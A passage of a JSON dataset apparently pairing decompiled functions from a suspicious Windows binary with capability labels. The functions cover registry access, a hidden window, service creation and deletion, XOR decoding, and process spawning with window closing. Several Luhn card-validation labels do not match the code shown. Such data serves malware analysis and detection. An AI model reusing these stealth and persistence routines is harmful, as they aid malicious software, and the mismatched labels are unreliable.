uVar2;\n            if (('\\0' < uVar5) && (uVar5 < '\\x01')) break;\n        }\n        else {\n            unaff_EDI = puVar4 + 1;\n            uVar1 = in(param_2);\n            *puVar4 = uVar1;\n            uVar6 = 0xbc;\n            if (bVar9 || bVar10) {\n                iVar3 = -0x74efaa75;\n                ppuVar7 = ppuVar7 + 1;\n                goto code_r0x004017a8;\n            }\n            ppuVar7 = ppuVar7 + 1;\n            *param_2 = *param_2 | param_2 >> 8;\n        }\n        *(ppuVar7 + -1) = uVar6 ^ *((iVar8 + -1) % *(ppuVar7 + 0xc) + *(ppuVar7 + 8));\n        uVar6 = *(ppuVar7 + -0x10);\n        param_2 = *(ppuVar7 + 0x18);\n        iVar8 = *(ppuVar7 + -0xc);\n        param_2[iVar8 + -1] = uVar6 ^ *(ppuVar7 + -1);\n        iVar3 = *(ppuVar7 + -8);\n        param_2[iVar8] = uVar6 ^ *(ppuVar7 + -2);\n        *(ppuVar7 + -0xc) = iVar8 + 2;\n        puStack4 = *(ppuVar7 + 0x14);\n        puVar4 = iVar3 + 1;\n        bVar9 = puVar4 < puStack4;\n        bVar11 = SBORROW4(puVar4, puStack4);\n        bVar10 = puVar4 == puStack4;\n        *(ppuVar7 + -8) = puVar4;\n        if (puStack4 <= puVar4) {\n            return;\n        }\n        iVar8 = *(ppuVar7 + -0xc);\n        puVar4 = unaff_EDI;\n    } while( true );\n    unaff_EBP = ppuVar7;\n    if (*(ppuVar7 + 8) != 0) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    goto code_r0x00401750;\n}\n",
        "token_count": 955
    },
    "004022f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004022f0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 != 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return iVar1 == 0;\n}\n",
        "token_count": 186
    },
    "00402380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402380(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "00402540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00402540(int32_t *hWnd)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405020;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4073f8);\n    if (iVar1 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x407404);\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar2, 0, 0, 2, 1000, 0xe4);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x407418);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar3)(lpdwResult, str._D_3, 0, &var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar4 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar4 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x00402969:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x00402975:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar4 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar4 < 0)) {\njoined_r0x00402930:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x00402975;\n                    }\n                    if (pbstr == 0) {\njoined_r0x0040276c:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00402380(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x40742c);\n                        if (iVar1 != 0) goto joined_r0x0040276c;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x00402915:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x00402969;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar1 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x00402915;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.00402380(iVar1, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar1 = fcn.00402490(&var_148h);\n                            if (iVar1 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x00402930;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            iVar1 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                iVar1 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2443
    },
    "00402a90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402a90(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)();\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x4073d4);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x402a10, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 365
    },
    "00402b90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402c8a) overlaps instruction at (ram,0x00402c86)\n// \n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00402bfe)\n// WARNING: Removing unreachable block (ram,0x00402be3)\n// WARNING: Removing unreachable block (ram,0x00402c7b)\n// WARNING: Removing unreachable block (ram,0x00402c7d)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402b90(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    char *unaff_EBX;\n    uint *unaff_ESI;\n    char **ppcVar6;\n    uint *puVar7;\n    uchar var_260h;\n    uint *var_25fh;\n    uchar s;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    fcn.004036d0();\n    iVar4 = fcn.004023b0();\n    if (iVar4 != 0) {\n        var_25fh = unaff_ESI + 1;\n        uVar1 = *unaff_ESI;\n        pcVar5 = *0x9750e2b5 + 1;\n        *pcVar5 = *pcVar5 + pcVar5;\n        *unaff_EBX = *unaff_EBX + (uVar1 >> 0x27);\n        var_260h = 0;\n        ppcVar6 = &var_25fh;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *ppcVar6 = pcVar5;\n            ppcVar6 = ppcVar6 + 1;\n        }\n        *ppcVar6 = pcVar5;\n        *(ppcVar6 + 2) = pcVar5;\n        iVar4 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n        if (iVar4 != 0) {\n            fcn.00401930();\n            s = 0;\n            puVar7 = &var_15bh;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            *(puVar7 + 2) = 0;\n    // WARNING: Could not recover jumptable at 0x00402c91. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x4073ac, &var_260h, 0x40738c, 3);\n            pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n            var_14h = 0;\n            do {\n                puVar7 = &var_58h;\n                for (iVar4 = 0x11; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                hProcess = 0;\n                var_58h = 0x44;\n                var_ch = 0;\n                var_2ch = 1;\n                lParam = 0;\n                var_28h._0_2_ = 0;\n                var_4h = 0;\n                iVar4 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &s, 0, 0, 0, 0, 0, 0, &var_58h, &hProcess);\n                if (iVar4 == 0) {\n                    return;\n                }\n                (*pcVar2)(3000);\n                (*_sym.imp.USER32.dll_EnumWindows)(fcn.00402a90, lParam);\n                iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hProcess, 1000);\n                if (iVar4 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 1);\n                }\n                pcVar3 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                (*pcVar3)(hProcess);\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1066
    },
    "00403a00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00403a00(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    bool bVar4;\n    uint32_t uStack20;\n    \n    uStack20 = in_EDX & 0xffff;\n    uStack20 = (in_EDX >> 8 & 0xffff00) << 8 | uStack20;\n    uVar3 = 0;\n    bVar4 = false;\n    if (arg_ch != 0) {\n        do {\n            if ((!bVar4) && (bVar4)) {\n                out(0xbd, in_EAX);\n                return CONCAT44(uStack20, in_EAX);\n            }\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            in_EAX = iVar1 / 0x1a;\n            uVar2 = iVar1 % 0x1a + 0x61;\n            uStack20 = iVar1 % 0x1a & 0xffffff00U | uVar2;\n            *(uVar3 + arg_8h) = uVar2;\n            uVar3 = uVar3 + 1;\n            bVar4 = uVar3 < arg_ch;\n        } while (bVar4);\n    }\n    return CONCAT44(uStack20, in_EAX);\n}\n",
        "token_count": 320
    },
    "004040a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004040a0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401410(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "004041c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004041e5) overlaps instruction at (ram,0x004041e4)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00404216)\n// WARNING: Removing unreachable block (ram,0x00404218)\n// WARNING: Removing unreachable block (ram,0x00404201)\n// WARNING: Removing unreachable block (ram,0x004041d5)\n\nvoid __cdecl fcn.004041c0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    ushort extraout_DX;\n    uint *unaff_EDI;\n    char cVar2;\n    char cVar3;\n    \n    if (arg_ch == 1) {\n        fcn.00402dc0();\n        cVar2 = extraout_DX >> 8;\n    // WARNING: Bad instruction - Truncating control flow here\n        cVar3 = SCARRY1(extraout_DX, cVar2);\n        cVar2 = extraout_DX + cVar2 < '\\0';\n        uVar1 = fcn.00401980();\n        if ((cVar3 == cVar2) && (cVar3 != cVar2)) {\n            out(0xc4, uVar1);\n            *unaff_EDI = uVar1;\n        }\n        fcn.00402b90();\n    // WARNING: Bad instruction - Truncating control flow here\n        if (*0x424738 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00401ca0();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 402
    },
    "004048a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004048ce)\n\nvoid __cdecl fcn.004048a0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.004046f0(&var_68h, &var_4h);\n    fcn.00404b50(&var_68h, var_4h, 0x4074a0, 0xa260);\n    *arg_8h = 0x4074a0;\n    *arg_ch = 0xa260;\n    return;\n}\n",
        "token_count": 257
    },
    "00404d30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d30(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    float10 fVar4;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    bVar3 = false;\n    fVar4 = fcn.00404bd0(&var_68h, &var_4h);\n    if ((!bVar3) && (bVar3)) {\n        *(puVar2 + 0x1f) = fVar4;\n    }\n    fcn.00404b50(&var_68h, var_4h, 0x411700, 0x13000);\n    *arg_8h = 0x411700;\n    *arg_ch = 0x13000;\n    return;\n}\n",
        "token_count": 297
    },
    "00404db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00404db0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00403eb0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403eb0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < arg_14h) {\n        do {\n            *(iVar1 + arg_10h) = arg_14h ^ *(iVar1 + arg_10h) ^ *(iVar1 % arg_ch + arg_8h);\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "004040e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get session user name"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004040e0(uint Sid)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &var_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, Sid);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 280
    },
    "00404b50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404b82) overlaps instruction at (ram,0x00404b81)\n// \n// WARNING: Removing unreachable block (ram,0x00404b82)\n\nvoid __cdecl fcn.00404b50(int32_t arg_8h, uint32_t arg_ch, uchar *arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    bool bVar4;\n    \n    uVar2 = 0;\n    bVar4 = false;\n    uVar1 = arg_14h;\n    if (arg_14h != 0) {\n        do {\n            if ((bVar4 == uVar1 < 0) && (bVar4 != uVar1 < 0)) {\n                uVar2 = uVar2 - 1;\n                puVar3 = arg_10h | &stack0xfffffffc;\n                arg_10h = puVar3 + 1;\n                *puVar3 = arg_14h;\n            }\n            arg_10h[uVar2] = arg_10h[uVar2] ^ *(uVar2 % arg_ch + arg_8h);\n            uVar2 = uVar2 + 1;\n            bVar4 = SBORROW4(uVar2, arg_14h);\n            uVar1 = uVar2 - arg_14h;\n        } while (uVar2 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 334
    },
    "00403c30": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403c30(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x40749c, 0x424728, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 139
    },
    "00401c70": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00401c70(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x40721c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 81
    },
    "00403c90": {
        "rules": [
            "get service handle",
            "create service"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00404a30": {
        "rules": [
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404a30(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    bool in_ZF;\n    char in_SF;\n    char in_OF;\n    \n    if ((!in_ZF && in_OF == in_SF) && (in_ZF || in_OF != in_SF)) {\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 243
    }
}